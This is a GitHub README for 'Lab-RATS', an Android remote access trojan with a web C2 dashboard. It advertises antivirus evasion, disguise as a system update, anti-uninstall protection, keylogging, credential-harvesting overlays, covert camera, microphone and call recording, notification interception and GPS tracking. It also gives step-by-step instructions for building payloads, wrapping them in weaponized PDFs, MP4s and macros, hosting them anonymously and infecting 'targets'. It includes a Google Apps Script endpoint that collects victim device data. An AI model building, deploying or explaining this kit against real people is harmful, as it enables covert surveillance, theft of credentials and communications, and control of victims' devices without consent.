<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
  
<p align="center">
<img width="1384" height="550" alt="Screenshot 2026-11-11 at 7 21 26 AM" src="https://github.com/user-attachments/assets/cddb6358-11f9-4ed6-a644-3b29c38fe5c2" />

<p align="center">
  <img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
  <img src="https://img.shields.io/badge/Android-SDK_36-green?style=for-the-badge&logo=android&logoColor=white">
  <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=openaccess&logoColor=white">
  <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
  <br>
  <img src="https://img.shields.io/badge/Network-Direct_IPv6/IPv4-informational?style=for-the-badge&logo=gitconnected&logoColor=white">
  <img src="https://img.shields.io/badge/Mode-Stealth_FUD-black?style=for-the-badge&logo=ghostfolio&logoColor=white">
  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
</p>

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=38&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
 />
</p>

> Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S.)*

Developed from the ground up by **K4N3CO**, **Lab-RATS** is an **open-source, lightweight Android Remote Administration Framework** packed with **real-time telemetry** and **covert control capabilities**. The framework **automates the generation of custom, signed `.apk` payloads** for seamless deployment onto **any Android devices**, paired with a **responsive, web-based C2 dashboard**. Engineered for **resilience in modern mobile security environments**, **Lab-RATS** delivers a **robust feature suite** operating reliably across both **legacy** and **current Android OS releases**.
<details>
  <summary><b>📸 View Comparative Breakdown</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/a2beda0b-122b-4e76-9daa-4d543e94dac3" alt="Full Web Page Screenshot" width="70%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
alt="Typing Banner"
 />
</p>

## 🌐 How Direct IPv6 Mode Works in Lab-RATS

<details>
<summary><b>1. What is Direct IPv6 Mode?</b></summary>

In Direct IPv6 Mode, **the target Android device itself acts as the C2 web server**. An embedded HTTP server (`NanoHTTPD`) runs inside the background Android service and listens directly on port `9191`.

</details>

<details>
<summary><b>2. The IPv6 Advantage: Eliminating CGNAT & Port Forwarding</b></summary>

* **The Traditional IPv4 Problem:** On standard IPv4 mobile networks (3G/4G/5G), cellular carriers place devices behind **Carrier-Grade NAT (CGNAT)**. This shares a single public IP address among thousands of mobile devices, making incoming connections impossible without port forwarding, reverse proxies, or tools like Ngrok.
* **The IPv6 Solution:** IPv6 assigns a unique **Global Unicast Address (GUA)** directly to the phone on 5G/LTE and Wi-Fi networks. Because every IPv6 address is globally unique and addressable across the internet, the C2 operator can connect directly to the target phone using its IPv6 address in any web browser (`http://[2001:db8::1]:9191`).

</details>

<details>
<summary><b>3. Zero-Configuration Peer-to-Peer (P2P) Control</b></summary>

* **No Cloud Relay Required:** Traffic flows directly between the operator's browser and the target device without passing through an intermediate cloud server.
* **No Router Access Needed:** Eliminates the need to access the target's Wi-Fi router or configure firewall rules.
* **Low Latency:** Eliminating middleman servers results in instant command execution and live screen streaming.

</details>
<details>
  <summary><b>📸 View IPv6 Exploit Vector</summary></b>
  <br><p align="center">
  <img src="https://github.com/user-attachments/assets/7097e0e0-1190-4774-b758-ca58b5e8760f" alt="Full Web Page Screenshot" width="80%">
</details>

> [!NOTE]
> **Lab-RATS also supports IPv4 connections** by **hosting on Render.com** *(Free Tier Supported)*. See **"Command & Control Option 2"** below for the **setup guide**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
</p>

  > [!IMPORTANT]
  > DEFAULT PASSWORD = admin1337

<details>
  <summary><b>🔐 Remote C2 Security & Secure Handshake</b></summary>
  <br>
  <ul>
    <li><strong>C2 Security:</strong><br>
  - The <strong>C2 Dashboard</strong> is <strong>protected with a secure login</strong> which can be <strong>changed directly from the Terminal/Home page</strong>. The <strong>Default Password should be reset immediately</strong> for <strong>enhanced security</strong>.</li>
    <li><strong>Secure Handshake:</strong><br>
  - Uses a <strong>masked credential handshake</strong>. Passwords are <strong>reversed and Base64 encoded</strong> <em>(<code>0x_</code> prefixed)</em> on the <strong>client-side before transmission</strong>, rendering them <strong>invisible to browser Network/Payload inspectors</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📦 Automated APK Generation, Identity Control & Density Scaling</b></summary>
  <br>
  <ul>
    <li><strong>Instant Build:</strong><br>
  - <strong>Instantly build</strong> <code>signed.apk</code> for <strong>production</strong> and <strong>testing</strong>.</li>
    <li><strong>Full Customization:</strong><br>
  - <strong>Fully</strong> customize <strong>App Name</strong>, <strong>Package ID</strong>, and <strong>Minimum SDK</strong>.</li>
    <li><strong>Density Scaling:</strong><br>
  - <strong>Resize logos automatically</strong> for <strong>all Android screen densities</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📱 PC/Mobile Responsive</b></summary>
  <br>
  <ul>
    <li><strong>Adaptive Interface:</strong><br>
  - The <strong>remote web interface</strong> is <strong>fully optimized</strong> for <strong>both PC</strong> and <strong>smartphone browsers</strong>, featuring a <strong>touch-friendly layout, adaptive navigation tabs</strong>, and <strong>scalable UI elements</strong> for <strong>monitoring from any device</strong>.</li>
 </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
</p>

<details>
  <summary><b>💉 APK Payload Delivery Vectors</b></summary>
  <br>
  <ul>
    <li><strong>Weaponization Engine:</strong><br>
  - The <strong>Weaponization Engine</strong> has been <strong>overhauled to support multiple high-success delivery methods</strong> <em>(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)</em>, <strong>ensuring reliable access</strong> across <strong>all modern mobile environments</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🛡️ Evasion Engine</b></summary>
  <br>
  <ul>
    <li><strong>AV/AVE Bypasses:</strong><br>
  - <strong>Undetectable by Samsung Knox</strong>, <strong>McAfee</strong> and <strong>Google Play Protect</strong>.</li>
    <li><strong>Deep Stealth HTML Shield:</strong><br>
  - The C2 dashboard <strong>utilizes Shadow DOM Cloaking</strong> and <strong>Base64 Payload Wrapping</strong>. Browser "Elements" inspection is <strong>zeroed-out</strong>, and the <strong>tactical structure is ghosted from analysts</strong>.</li>
    <li><strong>Web Hardening:</strong><br>
  - Assets <em>(JS/CSS)</em> are <strong>minified and obfuscated</strong>; featuring <strong>anti-debugging loops</strong> and <strong>interaction locks</strong> <em>(Right-Click, F12)</em> to <strong>prevent unauthorized analysis</strong>.</li>
    <li><strong>Dynamic Code Obfuscation:</strong><br>
  - Build-time <strong>randomization</strong> of <strong>logic flow</strong> and <strong>class names via ProGuard/R8 integration</strong>.</li>
    <li><strong>Encrypted Local Telemetry:</strong><br>
  - Internal <strong>system logs are encrypted at build-time</strong>, rendering them <strong>unreadable to standard mobile forensic tools</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🎭 Stealth App Decoys</b></summary>
  <br>
  <strong>Remotely swap the entire Lab-RATS app identity and icon instantly</strong> using <strong>the "Masquerade Library"</strong> of <strong>convincing, fully functional Clones</strong>:
  <ul>
    <li><strong>👀 Play Protect (Default):</strong><br>
  - <strong>Used for initial install</strong> it <strong>simulates a system stability update</strong> and <strong>auto-grants all permissions <em>(other than Accessibility services)</em> during the process</strong>, achieving <strong>highly successful installs</strong>.</li>
    <li><strong>🧮 Calculator:</strong><br>
  - <strong>Performs actual math</strong> with a <strong>tactical logic engine</strong>.</li>
    <li><strong>🌦️ Weather App:</strong><br>
  - Displays <strong>real-time localized forecasts</strong> via <strong>Open-Meteo API</strong>.</li>
    <li><strong>🛡️ Software Update:</strong><br>
  - <strong>Simulates a legitimate system update screen</strong> to <strong>build target trust</strong>.</li>
    <li><strong>🐭 Lab-Rats & System Stability Services:</strong><br>
  - <strong>Completely unmasked</strong> and <strong>directly opens</strong> the <strong>C2 server interface on device</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>☎️ Emergency Recovery & Self Healing</b></summary>
  <br>
  <ul>
    <li><strong>Dialer Unlock:</strong><br>
  - Type <code>*#1337#</code> on the <strong>phone's keypad</strong> to <strong>unmask the Lab-RATS server interface back into view</strong>.</li>
    <li><strong>Hidden Backdoor:</strong><br>
  - If the <strong>device is in stealth mode</strong>, <strong>rapidly tap the middle of the decoy screen 10 times</strong> to <strong>unlock the C2 server interface</strong>. <em>(Reverts to stealth mode again once app is closed)</em></li>
    <li><strong>Self-Healing Engine:</strong><br>
  - <strong>Automatically detects</strong> and <strong>repairs damaged service bindings</strong> or <strong>revoked permissions in the background</strong>.</li>
    <li><strong>Anti-Removal:</strong><br>
  - <strong>On by default</strong> in the <strong>Ghost Tab</strong>, it <strong>prevents the user from uninstalling</strong> or <strong>force-stopping the app</strong> via Settings.</li>
 </ul>
</details>

<details>
  <summary><b>🔄 Remote Server Restart</b></summary>
  <br>
  <ul>
    <li><strong>Web UI Restart:</strong><br>
  - <strong>One-click "RESTART_SERVER" button</strong> on the <strong>Terminal tab</strong> to <strong>refresh background services</strong>.</li>
    <li><strong>SMS Backdoor Trigger:</strong><br>
  - Send an <strong>SMS/Text containing <code>!RESTART_C2</code></strong> to the <strong>device's number</strong> to <strong>force the server back online</strong> even if it was <strong>manually closed or killed by the OS</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>👻 Task-List Ghosting & Dynamic OTA Camouflage</b></summary>
  <br>
  <ul>
    <li><strong>Recent Apps Ghosting:</strong><br>
  - The app is <strong>hard-coded</strong> to be <strong>invisible in the Android "Recent Apps" list</strong>.</li>
    <li><strong>Dynamic OTA Camouflage:</strong><br>
  - Generates <strong>random version names and codes</strong> that <strong>mimic legitimate system OTA updates</strong>.</li>
 </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
</p>

<details>
  <summary><b>👻 Ghost Operations</b></summary>
  <br>
  <ul>
    <li><strong>Ghost Control / Live Feed:</strong><br>
  - <strong>Cast & Control the live screen remotely</strong> with <strong>NO "Consent Prompt" required</strong>.</li>
    <li><strong>Blackout Mode:</strong><br>
  - A <strong>high-stealth mode</strong> designed to <strong>physically mask the target's device display</strong> while maintaining a <strong>NON-masked live remote feed</strong>. <em>(Pair with Ghost Control for maximum stealth)</em></li>
    <li><strong>Ghost_Toast Overlays:</strong><br>
  - Remotely deploy <strong>tactical, persistent pop-up overlays</strong> with <strong>fully customizable text</strong> <em>(color, size, and screen positioning)</em>. Features <strong>multiple animation styles</strong> <em>(pop, static, and side-scroll)</em> alongside a <strong>high-intensity "Burnt_Toast" mode</strong> that <strong>floods the screen with randomized pop-ups</strong> to <strong>overwhelm the device</strong>.</li>
    <li><strong>Remote System Denial Lock:</strong><br>
  - Deploy a <strong>persistent, full-screen security overlay</strong> to <strong>lock physical interaction</strong> and <strong>render the device inoperable until hard-reset/restarted</strong> or <strong>unlocked remotely from the C2 dashboard</strong>.</li>
    <li><strong>Live Keylogging & Sensitive Extraction:</strong><br>
  - Intercept <strong>keystrokes</strong> and <strong>system text in real-time</strong>. Features <strong>Sensitive Info Highlighting</strong> <em>(Passcodes, OTPs, Emails glow Red)</em> and <strong>Deep Extraction</strong> for <strong>browser login info</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🧪 Exploit Factory</b></summary>
  <br>
  <ul>
    <li><strong>NFC Proximity Vector:</strong><br>
  - Generate <strong>binary NDEF payloads for physical tags</strong>.</li>
    <li><strong>QR Visual Vector:</strong><br>
  - Dedicated <strong>high-density QR code generator</strong> for independent URL delivery.</li>
    <li><strong>Smishing Library:</strong><br>
  - Pre-configured <strong>tactical phishing templates</strong>.</li>
    <li><strong>Shadow Overlay Injection:</strong><br>
  - Remotely <strong>inject functional, pixel-perfect credential-harvesting overlays</strong> to the device.</li>
 </ul>
</details>

<details>
  <summary><b>💀 Anti-Removal & Self Destruct</b></summary>
  <br>
  <ul>
    <li><strong>Anti-Removal Shield:</strong><br>
  - <strong>High-speed, event-driven protection shield</strong> that <strong>Blocks Attempts</strong> to <strong>Uninstall</strong> or <strong>Force Stop</strong> the <strong>app</strong>.</li>
    <li><strong>Suicide (Self-Destruct):</strong><br>
  - <strong>Remote-triggered persistent loop</strong> that <strong>wipes all local configuration</strong> and <strong>initiates a hard uninstallation of the C2 Core</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🛰️ Live GPS Tracking & Intel Stream</b></summary>
  <br>
  <ul>
    <li><strong>Live GPS Uplink:</strong><br>
  - <strong>One-click uplink</strong> to open the <strong>device's exact real-time location</strong> using <strong>Google Maps</strong>.</li>
    <li><strong>Live Notification Stream:</strong><br>
  - <strong>Intercept every app notification</strong> <em>(WhatsApp, Telegram, RCS, System...etc)</em> in a <strong>live feed</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📸 Tactical Surveillance Hub (Ultra-Stability)</b></summary>
  <br>
  <ul>
    <li><strong>Covert Video Recording:</strong><br>
  - <strong>Stealthily record video without any user-facing activity</strong>.</li>
    <li><strong>Covert Photo Capture:</strong><br>
  - <strong>Covert image capture</strong> integrated into the <strong>live stream</strong>.</li>
    <li><strong>Nightmode V2:</strong><br>
  - Aggressive <strong>electronic brightening</strong> for <strong>low-light environments</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🎙️ Acoustics & Interception</b></summary>
  <br>
  <ul>
    <li><strong>Microphone & Call Recording:</strong><br>
  - <strong>Timed or Live microphone recording</strong> and <strong>automated call recording</strong> for <strong>both incoming and outgoing calls</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📂 Advanced Data Uplink</b></summary>
  <br>
  <ul>
    <li><strong>Info Gathering:</strong><br>
  - Access <strong>Call Logs</strong>, <strong>Contacts</strong>, <strong>Hardware Analytics</strong>, and <strong>Installed Apps</strong> remotely.</li>
    <li><strong>Integrated File Manager:</strong><br>
  - <strong>Navigate, download</strong>, and <strong>manage files</strong>. Features an <strong>instant Search Bar</strong> and <strong>Category Filters</strong>.</li>
    <li><strong>Direct File Editor:</strong><br>
  - <strong>Live-edit text, JSON</strong>, and <strong>log files</strong> directly <strong>on the device</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🖥️ Enhanced Remote Shell</b></summary>
  <br>
  <strong>The Terminal Tab's Built-in Shell has been overhauled for professional workflows:</strong>
  <ul>
    <li><strong>Command History:</strong><br>
  - Navigate <strong>previous commands instantly</strong> using <strong>Up/Down arrows</strong>.</li>
    <li><strong>Modernized Interface:</strong><br>
  - Updated to <code>root@Android</code> prompt with <strong>an updated <code>help</code> menu</strong>.</li>
    <li><strong>Hardened I/O:</strong><br>
  - <strong>Multi-stage retry logic</strong> and <strong>unique execution tracking</strong> for <strong>zero-latency command output</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📊 Telemetry & Reporting</b></summary>
  <br>
  <ul>
    <li><strong>C2 Auto-Reporting:</strong><br>
  - <strong>Discrete reporting</strong> of <strong>Date & Time, Device ID, Connection Type <em>(WiFi/Cellular)</em>, IP, Port, C2 Dashboard Link, Battery % and more</strong> to a <strong>centralized Google Sheet or Render C2</strong>.</li>
 </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"/>
</p>

<details>
  <summary><b>🛠️ Termux Bridge Integration</b></summary>
  <br>
  <strong>Lab-RATS features a high-performance bridge to the Termux environment. If Termux is installed on the target device, the remote terminal can instantly elevate its capabilities:</strong>
  <ul>
    <li><strong>Auto-Routing:</strong><br>
  - Common commands like <code>pkg</code>, <code>apt</code>, <code>pip</code>, and <code>python</code> are <strong>routed through the bridge</strong>.</li>
    <li><strong>Unrestricted Tools:</strong><br>
  - <strong>Install</strong> and <strong>run Python scripts, Nmap scans, or Metasploit</strong> from the <strong>C2 web terminal</strong>.</li>
    <li><strong>Persistent Environment:</strong><br>
  - Full support for <strong>Termux's internal storage</strong> and <strong>standard Linux binaries</strong>.</li>
  </ul>
  
  > Termux Bridge Issues:<br>
  > "Termux `allow-external-apps` setting is disabled" (Most Common).<br>
  > Fix:<br>
  > On the Target Device open Termux and run:
  ```
  echo "allow-external-apps = true" >> ~/.termux/termux.properties
  termux-reload-settings
  ```
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
</p>

**Lab-RATS** supports **TWO primary methods** to **Receive Data, Connect Remotely & Track your Devices**.

### 🔄 Direct IPv6 (Google Sheet) vs. Render Cloud Relay (Node.js)

| Feature | Direct IPv6 Mode (P2P) | Render Cloud Relay Mode |
| :--- | :--- | :--- |
| **Server Architecture** | On-Device (`NanoHTTPD` on port `9191`) | Cloud Server (`c2-server/server.js`) |
| **Network Requirement** | Public IPv6 Address (`2xxx:` or `3xxx:`) | Any Network (IPv4, IPv6, NAT, Firewall) |
| **Bypasses CGNAT & Routers** | Yes (via IPv6 Global Address) | Yes (via Outbound Relay Tunnel) |
| **Third-Party Infrastructure** | None (Direct P2P Connection) | Render / Express Node |
| **Latency** | Ultra-Low (Direct Stream) | Low (Relay Stream) |
| **Best Used For** | Direct peer-to-peer control on 5G/Wi-Fi | Networks blocking inbound connections |

### ☝🏻 Option 1: Direct IPv6 (Google Sheet) 
**Best for Basic IP tracking** & **logging**. **NO server maintenance required!**.

1. **Create a New** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
2. Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return 
handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    
    // Auto-initialize headers if new sheet
    if (sheet.getLastRow() == 0) {
      sheet.appendRow([
        "Timestamp", 
        "Model #", 
        "Connection Type", 
        "IP Address", 
        "Port", 
        "Active C2 Link", 
        "Battery", 
        "Stealth Status", 
        "Power", 
        "Free Storage"
      ]);
    }
    
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    
    var row = [
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || 
data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ];
    
    sheet.appendRow(row);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3. Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.

> [!IMPORTANT]
> 4. **Copy the Google Webhook URL provided** *(e.g., `https://script.google.com/macros/s/AKfycbwXQSVQ0dYdi...`)* and **prepare to paste it into the APK-Builder when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.

<details>
  <summary><b>📸 View Google Sheet Reporting Example</summary></b>
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
</details>

---

### ✌🏻 Option 2: Render Cloud Relay (Tactical Node.js Backend)
**Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.

**1. Fork the Lab-RATS repository**.
<br>**2. Create a New Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
<br>**3. Once connected, Set the Root Directory** to `c2-server/`
<br>**4. Set the Build Command** to `npm install` & **the Start Command** to `npm start`
<br>**5. Deploy!**

> [!IMPORTANT]
> **Once live, Copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, and **prepare to enter it into the APK-Builder when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.

<details>
  <summary><b>🌐 Advantages of Option 2</b></summary>
  <br>
  <ul>
    <li><strong>Dual-Stack IP Binding:</strong><br>
  - <strong>Full support for both IPv4 and IPv6 connections</strong>, <strong>enabling seamless C2 telemetry</strong> and <strong>reverse WebSocket tunneling</strong> across <strong>cellular carrier NAT64</strong> and <strong>dual-stack Wi-Fi networks worldwide</strong>.</li>
    <li><strong>Exfiltration Vault:</strong><br>
  - <strong>Audio/Video recordings</strong> are <strong>automatically uploaded</strong> and <strong>stored on your server</strong>.</li>
    <li><strong>Live Fleet List:</strong><br>
  - A <strong>professional dashboard</strong> to <strong>manage all devices in one place</strong>, with <strong>editable device name</strong> for <strong>easy device recognition</strong> and <strong>NEW 'Quick Action' pull-down menu</strong> to <strong>deploy some features without directly connecting</strong>.</li>
    <li><strong>Dynamic Sync:</strong><br>
  - <strong>Heartbeat reporting</strong> ensures your <strong>P2P links are always up-to-date</strong>.</li>
  </ul>
</details>

<details>
  <summary><b>📸 View Render Setup</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
  </details>

<details>
  <summary><b>📸 View Render C2 Screenshot</summary></b>
  <br>
  <img width="867" height="500" alt="Screenshot 2026-11-14 at 3 00 47 PM" src="https://github.com/user-attachments/assets/02cd24bc-ed70-421a-98ab-b8769b9dce52" />
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
</p>

To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your Environment meets the following requirements**:

<details>
  <summary><b>🛠️ 1. Workstation & Build Requirements (To Build APKs)</b></summary>
  <br>
  <ul>
    <li><strong>Java Development Kit (JDK):</strong><br>
  - <strong>JDK 17 or JDK 21</strong> <em>(JDK 21 recommended)</em>. Ensure <code>JAVA_HOME</code> is set in <strong>your environment paths</strong>.</li>
    <li><strong>Android SDK:</strong><br>
  - <strong>Android SDK 34</strong> <em>(API Level 34)</em> or <strong>higher</strong>. Build-Tools version <code>34.0.0</code> or <strong>higher</strong> <em>(includes <code>aapt2</code>, <code>zipalign</code>, and <code>apksigner</code>)</em>.</li>
    <li><strong>Python 3.x:</strong><br>
  - Required for <strong>Option 7: Smali Surgery & APK Binder</strong> <em>(<code>binder.py</code>)</em>.</li>
    <li><strong>Gradle:</strong><br>
  - Handled <strong>automatically</strong> via the included <code>./gradlew</code> <em>(Gradle 8.10+)</em>.</li>
  </ul>
</details>

<details>
  <summary><b>☁️ 2. C2 Server Hosting Requirements (For Option 2: Render.com/Railway)</b></summary>
  <br>
  <ul>
    <li><strong>Node.js:</strong><br>
  - <strong>v18.0.0</strong> or <strong>higher</strong>.</li>
    <li><strong>npm:</strong><br>
  - <strong>v9.0.0</strong> or <strong>higher</strong>.</li>
    <li><strong>Render / Linux Hosting:</strong><br>
  - 512 MB RAM minimum <em>(Render Free Tier supported)</em>.</li>
  </ul>
</details>

<details>
  <summary><b>📱 3. Android Device Compatibility</b></summary>
  <br>
  <ul>
    <li><strong>Minimum OS:</strong><br>
  - <strong>Android 5.0</strong> <em>(Lollipop/API 21)</em> or <strong>higher</strong>.</li>
    <li><strong>Target OS:</strong><br>
  - <strong>Android 14 - 17</strong> <em>(API 34 - 37)</em> <strong>fully supported</strong>.</li>
    <li><strong>Supported Devices:</strong><br>
  - <strong>Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG</strong>, and <strong>generic Android devices/emulators</strong>.</li>
  </ul>
</details>

<details>
  <summary><b>💻 4. Operating System Compatibility</b></summary>
  <br>
  <ul>
    <li><strong>🐧 Linux:</strong><br>
  - <strong>Kali Linux, Ubuntu, Debian, Arch</strong> <em>(Full support for build scripts & C2 server)</em>.</li>
    <li><strong>🍎 macOS:</strong><br>
  - <strong>macOS Monterey / Ventura / Sonoma / Sequoia</strong> <em>(Intel & Apple Silicon M1/M2/M3/M4)</em>.</li>
    <li><strong>🪟 Windows:</strong><br>
  - <strong>Windows 10 / 11 via PowerShell, Command Prompt</strong>, or <strong>WSL2</strong>.</li>
  </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
 />
</p>

### 1. Build the APK (on PC)
1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS.git`
2.  **Navigate** to: `cd /Lab-RATS/apk-builder/`
3.  **Execute** the **Builder**:
    *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
    *   **Windows**: `build.bat`
4.  **Select a Build Strategy**:
    *   **Option 1 (Manual)**: For **standard configuration** of **App Name, ID**, and **Logo** before **building**.
    *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
> [!IMPORTANT]
> 5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting and connections** *("Command & Control Options" section above)*.
6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS/apk-builder/output/`

<details>
  <summary><b>📸 View APK-Builder Menu</summary></b>
  <img src="https://github.com/user-attachments/assets/8cb583e6-6c59-46cf-8f94-668f0a34b74e" alt="Full Web Page Screenshot" width="60%">
</details>

### 2. Deploy & Install onto Android Devices
**Deployment** is **a Multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.

<details>
  <summary><b>📑 Strategic Weaponization (The Wrapper)</b></summary>
  <br>
  <strong>Standard <code>.apk</code> files are often blocked by email filters and browser security. Use the Infection Chain Wizard <em>(Option 6)</em> in the <code>apk-builder</code> tool to wrap your link inside a high-compatibility carrier file:</strong>
  <ul>
    <li><strong>📑 Stealth PDF:</strong><br>
  - Send to <strong>targets via Email or Drive</strong>. Utilizes <strong>URI Actions</strong> instead of <strong>JavaScript</strong> to trigger an <strong>automatic browser-based download, bypassing standard PDF security filters</strong>.</li>
    <li><strong>🎬 Zero-Click MP4:</strong><br>
  - <strong>Send as a video file</strong>. Exploits mobile <strong>Media Heap Overflows</strong> during <strong>gallery indexing or thumbnail generation</strong> to <strong>force-register the C2 link in the background</strong>.</li>
    <li><strong>🔳 QR Code / 📡 NFC:</strong><br>
  - <strong>Best for physical placement</strong> or <strong>"Tap-to-Infect" proximity delivery</strong>. Generates a <strong>high-density QR</strong> or <strong>NDEF record</strong> pointing to the <strong>hardened delivery URL</strong>.</li>
    <li><strong>And Many More:</strong><br>
  - The <strong>Wizard</strong> also supports <strong>ADB Strategic Bridge, Stego Image Tails, PWA Manifests</strong>, and <strong>Office Document macros</strong>.</li>
  </ul>
</details>

<details>
  <summary><b>🌐 Hosting Strategies</b></summary>
  <br>
  <ul>
    <li><strong>Anonymous Cloud:</strong><br>
  - <strong>Option 6</strong> uses <code>Catbox.moe</code> <strong>by default</strong>. It is <strong>anonymous, fast</strong>, and <strong>generates a direct link</strong>. Features <strong>fallback hosting on <code>Litterbox</code> or <code>Tmpfiles</code> if <code>Catbox.moe</code> fails</strong>.</li>
    <li><strong>P2P Direct:</strong><br>
  - Host the <strong>APK directly from your PC using a public tunnel</strong>, or from <strong>another infected device</strong> using the <code>/download/</code> endpoint.</li>
  </ul>
</details>

<details>
  <summary><b>🚀 Installation & Initialization</b></summary>
  <br>
  <strong>Once the target device downloads the APK:</strong>
  <ul>
    <li><strong>1. Manual Sideload:</strong><br>
  - If you have <strong>physical access to the device</strong>, use <code>adb install signed.apk</code></li>
    <li><strong>2. 'One-Click' Permission Granting (CRITICAL):</strong><br>
  - <strong>Open the app ONCE</strong>. <strong>Only the initial Pop-up <em>(Accessibility Services)</em> must be manually toggled on</strong>; <strong>ALL other permissions are now auto-granted by the system</strong> using a <strong>convincing security sequence</strong>.</li>
    <li><strong>3. Remote Permission Prompt:</strong><br>
  - If a <strong>user removes any permissions</strong>, you can <strong>remotely trigger the system prompts again</strong> using the <strong>repair buttons</strong> in the <strong>GHOST UTILITIES</strong> section.</li>
    <li><strong>4. Self-Vanishing:</strong><br>
  - A <strong>few seconds after launch</strong>, the app will <strong>automatically replace its icon and name</strong> with the <strong>decoy you chose during build</strong> <em>("System Update", "Calculator"...etc)</em>.</li>
    <li><strong>5. Uplink Confirmation:</strong><br>
  - Check your <strong>Google Sheet or Render C2</strong>. <strong>Within 5 seconds of initialization</strong>, the <strong>Device ID, Connection Type, IP, Port, C2 Dashboard Link, Battery % and more will appear in the log</strong>.</li>
  </ul>
</details>

---

<p align="left">
